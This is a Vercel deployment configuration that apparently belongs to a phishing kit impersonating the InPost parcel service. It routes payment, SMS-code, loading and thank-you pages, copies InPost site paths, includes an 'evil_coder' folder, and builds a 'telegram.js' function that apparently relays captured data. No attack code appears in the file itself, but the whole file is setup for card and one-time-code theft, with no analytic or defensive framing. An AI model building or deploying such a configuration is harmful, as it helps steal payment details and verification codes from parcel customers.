{
  "version": 2,
  "builds": [
    {
      "src": "api/telegram.js",
      "use": "@vercel/node"
    },
    {
      "src": "index.html",
      "use": "@vercel/static"
    }
  ],
  "routes": [
    { "src": "/(.*)", "dest": "/index.html" },
    { "src": "/pay/ment.html", "dest": "/pay/ment.html" },
    { "src": "/sms.html", "dest": "/sms.html" },
    { "src": "/thanks.html", "dest": "/thanks.html" },
    { "src": "/error.html", "dest": "/error.html" },
    { "src": "/loading.html", "dest": "/loading.html" },
    { "src": "/manifest.json", "dest": "/manifest.json" },
    { "src": "/timeout", "dest": "/timeout" },
    { "src": "/assets/(.*)", "dest": "/assets/$1" },
    { "src": "/evil_coder/(.*)", "dest": "/evil_coder/$1" },
    { "src": "/files/(.*)", "dest": "/files/$1" },
    { "src": "/modules/custom/inpost_popup/js/(.*)", "dest": "/modules/custom/inpost_popup/js/$1" },
    { "src": "/sites/default/files/(.*)", "dest": "/sites/default/files/$1" },
    { "src": "/themes/custom/inpost/(.*)", "dest": "/themes/custom/inpost/$1" },
    { "handle": "filesystem" }
  ]
}
